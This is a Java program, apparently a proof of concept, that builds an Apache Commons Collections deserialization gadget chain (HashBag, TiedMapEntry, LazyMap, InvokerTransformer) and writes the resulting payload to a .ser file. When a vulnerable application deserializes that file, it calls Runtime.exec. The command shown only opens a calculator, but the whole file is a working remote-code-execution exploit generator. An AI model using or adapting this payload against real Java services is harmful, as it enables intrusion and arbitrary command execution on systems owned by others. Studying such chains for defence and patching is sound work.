import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.bag.HashBag;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.mockito.internal.util.reflection.Whitebox;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;

public class Concept13 {
    public static void main(String[] args) {
        try {
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod",
                            new Class[]{String.class, Class[].class},
                            new Object[]{"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke",
                            new Class[]{Object.class, Object[].class},
                            new Object[]{null, new Object[0]}),
                    new InvokerTransformer("exec",
                            new Class[]{String.class},
                            new String[]{"/usr/bin/gnome-calculator"}),
            };

            Transformer chainedTransformer = new ChainedTransformer(transformers);

            Map hashMap = new HashMap();
            Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);  // calls => chainedTransformer.transform()

            String key = "invalid_key";

            // Create a TiedMapEntry with the underlying hashmap as our `lazyMap` and invalid_key
            TiedMapEntry tidemapentry = new TiedMapEntry(lazyMap, key);
            HashBag hashBag = new HashBag();

            hashBag.add(new Object());

            // set HashBag’s underlying HashMap table’s first entry’s KEY to be our TiedMapEntry
            Map internalMap = (Map) Whitebox.getInternalState(hashBag, "map");
            Object[] nodesArray = (Object[]) Whitebox.getInternalState(internalMap, "table");
            Object node = Arrays.stream(nodesArray)
                    .filter(Objects::nonNull)
                    .findFirst()
                    .orElseThrow(() -> new RuntimeException("this can't happen"));

            Whitebox.setInternalState(node, "key", tidemapentry);

            String fileName = "bad_serialized_object.ser";
            // serializing an object
            FileOutputStream fout = new FileOutputStream(fileName);
            ObjectOutputStream oout = new ObjectOutputStream(fout);
            oout.writeObject(hashBag);   // actual serialization
            oout.close();
            fout.close();
            System.out.println("\nThe object was written to " + fileName);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
